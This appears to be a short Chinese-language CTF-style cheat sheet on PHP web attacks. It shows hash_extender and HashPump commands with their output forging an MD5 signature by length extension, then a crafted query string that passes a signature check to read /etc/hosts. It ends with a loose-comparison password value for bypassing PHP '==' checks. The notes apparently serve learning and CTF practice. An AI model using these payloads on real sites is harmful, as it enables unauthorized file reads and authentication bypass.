
# web基础

* php攻击


## php攻击
###  MD5 Length Extension Attack
* 工具
1. hash_extender  
> https://github.com/iagox86/hash_extender
2. HashPump  
> https://github.com/bwall/HashPump

* 代码
```shell
$ ./hash_extender -f md5 -l 32 -d '/etc/hosts' -s 'f3d366138601b5afefbd4fc15731692e' -a '' --out-data-format=html
Type: md5
Secret length: 32
New signature: 1b17d9594eb404c97c5090b11660ac63
New string: %2fetc%2fhosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00

$ ~/Desktop/HashPump
$ hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/hosts 
75221e2e5cd1cd1c7694cbd386571ffe
/etc/hosts\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00/etc/hosts


//最后构成
?filepath=%2fetc%2fhosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00%2fetc%2fhosts&sign=75221e2e5cd1cd1c7694cbd386571ffe
``` 

### 弱类型漏洞

* 弱类型漏洞之 ==

> password=240610708
